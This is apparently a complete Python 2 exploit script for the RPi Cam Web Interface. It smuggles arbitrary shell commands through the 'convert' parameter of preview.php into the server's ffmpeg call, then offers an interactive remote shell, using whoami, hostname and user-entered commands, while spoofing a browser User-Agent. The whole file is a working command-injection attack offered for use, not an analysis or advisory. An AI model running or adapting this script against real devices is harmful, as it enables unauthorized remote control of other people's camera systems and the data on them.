#!/usr/bin/python

import sys
import requests
import os
import re
import readline

def usage():

	print "\nRPi Cam Web Interface Exploit\n"
	print "Usage: %s http://host/path/to/preview.php \n" % sys.argv[0]
	print "Options: "
	print "  -h, --help              Show this help message and exit"
	print ""
	sys.exit(0)

def execute_command(url, cmd):

	split = "---a97a13f9f48c65c72e4802fc1e516e3f---"
	convert = ".) >/dev/null 2>&1; (" + cmd + ") 2>&1; echo " + split + ";#aaaaaaa"
	convertCmd = "/usr/bin/ffmpeg -f image2 -i i_%05d.jpg"
	data = {"convert":convert,"convertCmd":convertCmd}
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"}

	try:
		r = requests.post(url, headers=headers, data=data)#, verify=False)
		if r.status_code == 200:
			if len(r.content) > 0 and split in r.content:
				return r.content.split(split)[0]
			else:
				return ""
		else:
			print "\n[*] Error: Received HTTP Status " + str(r.status_code) + "\n"
			return ""
	except requests.ConnectionError as e:
		print "\n[*] Error: An error occurred while connecting to the host.\n"
		exit(1)
	except requests.exceptions.RequestException as e:
		print "\n[*] Error: Something unexpected happened.\n"
		print e
		exit(1)

def main():

	if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
		usage()

	url = sys.argv[1]

	print "\nRPi Cam Web Interface Exploit"

	print "\n[*] Attempting exploit on:"
	print "    " + url

	username = execute_command(url,"whoami").strip()
	if len(username) == 0:
		exit(1)

	hostname = execute_command(url, "hostname").strip()

	path = execute_command(url, "pwd").strip()

	print "\n[*] Returning prompt!\n"

	try:
		while True:
			prompt = username + "@" + hostname + ":" + path + "$ "
			cmd = raw_input(prompt)
			if cmd == "exit":
				print "\n[*] Goodbye!\n"
				return
                        elif cmd.startswith("cd "):
                                chars = set(";&|")
				if any((c in chars) for c in cmd):
					print "[*] This shell only supports cd as a standalone command."
				else:
					cmd = cmd.split()
					tmpPath = " ".join(cmd[1:])
					if tmpPath == "..":
						if len(path.split("/")) > 2:
							tmpPath = "/".join(path.split("/")[:-1])
						else:
							tmpPath = "/"
					cmd = "cd " + path + " && cd " + tmpPath + " 2>&1 && pwd"
					tmpPath = execute_command(url,cmd).strip()
					if tmpPath.startswith("/") or re.match("^[a-zA-Z]:\\)*",tmpPath):
						path = tmpPath
					else:
						print tmpPath.split('\n')[0]
			elif cmd == "clear":
				os.system("clear")
			else:
				cmd = "cd " + path + " && " + cmd
				results = execute_command(url, cmd)
				if len(results) != 0:
					print results

	except KeyboardInterrupt:
		print "\n\n[*] Goodbye!\n"
		return

if __name__ == "__main__":
	main()
